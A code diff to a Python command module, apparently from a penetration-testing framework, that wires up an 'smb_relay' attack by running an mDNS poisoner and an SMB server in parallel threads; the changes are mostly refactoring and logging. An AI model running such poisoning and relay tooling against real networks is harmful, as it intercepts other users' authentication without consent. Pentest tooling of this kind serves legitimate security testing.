@@ -1,4 +1,3 @@
-from typing import final
 from cmd2.command_definition import with_default_category
 from cmd2 import CommandSet, with_default_category, Cmd2ArgumentParser, with_argparser
 import argparse
@@ -12,34 +11,21 @@ from threading import Thread
 class SmbRelay(CommandSet):
     def __init__(self) -> None:
         super().__init__()
-
-    @property
-    def stop_attack(self):
-        return self._stop_attack
+        # Logging info to the logs from logguru
 
     def config_poison_and_server(self, mdns_poisoner, smbserver):
+        self._cmd.poutput("Starting mdns poisoner")
         mdns_thread = Thread(target=mdns_poisoner.start_mdns_poisoning)
-        smbserver_thread = Thread(target=smbserver.start_smbserver)
         mdns_thread.daemon = True
+
+        self._cmd.poutput("Starting smb server")
+        smbserver_thread = Thread(target=smbserver.start_smbserver)
         smbserver_thread.daemon = True
 
         mdns_thread.start()
         smbserver_thread.start()
 
         smbserver_thread.join()
-
-        """
-        mdns_process = multiprocessing.Process(
-            target=mdns_poisoner.start_mdns_poisoning
-        )
-        mdns_process.start()
-
-        smbserver_process = multiprocessing.Process(target=smbserver.start_smbserver)
-        smbserver_process.start()
-
-        smbserver_process.join()
-        mdns_process.join()
-        """
 
     argParser = Cmd2ArgumentParser(
         description="""Tool to perform the smb_relay attack attack"""
@@ -54,13 +40,13 @@ class SmbRelay(CommandSet):
     @with_argparser(argParser)
     def do_smb_relay(self, args: argparse.Namespace) -> None:
         mdns_poisoner = MDNS(
-            self._cmd.IP_TARGET,
+            self._cmd.LHOST,
             self._cmd.IPV6,
             self._cmd.MAC_ADDRESS,
             self._cmd.INTERFACE,
         )
 
-        smbserver = SmbServer(self._cmd.LHOST, self._cmd.LPORT, self._cmd.stdout)
+        smbserver = SmbServer("0.0.0.0", self._cmd.LPORT, self._cmd.stdout)
 
         self._cmd.logger.info(
             f"""Starting smb relay attack using ip: {self._cmd.IP_TARGET} ipv6:{self._cmd.IPV6}
@@ -68,7 +54,7 @@ class SmbRelay(CommandSet):
         )
 
         settable_variables_required = {
-            "IP_TARGET": self._cmd.IP_TARGET,
+            "LHOST": self._cmd.LHOST,
             "IPV6": self._cmd.IPV6,
             "INTERFACE": self._cmd.INTERFACE,
             "MAC_ADDRESS": self._cmd.MAC_ADDRESS,
@@ -87,26 +73,4 @@ class SmbRelay(CommandSet):
             except KeyboardInterrupt:
                 attack.terminate()
                 attack.join()
-                self._cmd.pwarning("Exiting...")
-
-            """
-            try:
-                mdns_process = multiprocessing.Process(
-                    target=mdns_poisoner.start_mdns_poisoning
-                )
-                mdns_process.start()
-
-                smbserver_process = multiprocessing.Process(
-                    target=smbserver.start_smbserver
-                )
-                smbserver_process.start()
-
-                smbserver_process.join()
-                mdns_process.join()
-            except KeyboardInterrupt:
-                smbserver_process.terminate()
-                mdns_process.terminate()
-                mdns_process.join()
-                smbserver_process.join()
-                self._cmd.pwarning("Exiting...")
-            """
+                self._cmd.pwarning("Exiting smb relay attack ...")
